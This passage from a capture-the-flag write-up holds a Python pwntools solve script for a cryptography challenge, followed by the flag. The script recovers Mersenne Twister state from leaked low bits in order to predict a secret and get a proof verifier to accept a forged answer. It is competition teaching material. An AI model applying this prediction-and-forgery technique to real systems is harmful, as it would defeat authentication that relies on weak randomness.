    return io.recvuntil(b"e=").decode()

def two_adic_order(p):
    h = p - 1
    while h % 2 == 0:
        h //= 2

    g = pow(2, h, p)
    s, cur = 0, g
    while cur != 1:
        s += 1
        cur = pow(cur, 2, p)

    return s, h, g

def pass_stage2(io, data, p, s, h, g, rec):
    table = {pow(g, i, p): i for i in range(1 << s)}

    sent = 0
    while data.count("e=") < N + 1:
        k = min(100, N - sent)
        if k:
            io.send(((str(E) + "\nN\n") * k).encode())
            sent += k
        data += io.recv(1 << 20, timeout=300).decode(errors="ignore")

    avals = list(map(int, re.findall(r"a=([0-9]+)", data)))[:N]
    obs = [table[pow(a, h, p)] & ((1 << LBITS) - 1) for a in avals]

    pre = rec.recover_prestate(obs)
    w = first_getrandbits_1024_from_prestate(pre)

    io.sendline(str(E).encode())
    io.recvuntil(b"verifier accept? (Y/N)")
    io.sendline(b"Y")
    io.recvuntil(b"w=")
    io.sendline(str(w).encode())

    print(io.recvall(timeout=20).decode())

def main():
    rec = LowBitMTRecover(N, LBITS)

    attempt = 0
    while True:
        attempt += 1
        io = remote(HOST, PORT)

        try:
            st2 = pass_stage1(io)
            p = parse(st2, "p")
            s, h, g = two_adic_order(p)

            log.info(f"attempt={attempt}, s={s}")

            if s >= LBITS:
                pass_stage2(io, st2, p, s, h, g, rec)
                break

        except Exception as e:
            log.warning(str(e))

        io.close()
        time.sleep(0.2)

if __name__ == "__main__":
    main()
```


Flag: ```NHNC{wow_i_am_wondering_about_if_there_are_any_in_the_wild_exploitable_zkp_like_this_:D}```

## TEARoam
![alt text](/assets/img/posts/no-hack-no-ctf-2026/TEARoam-1.png)

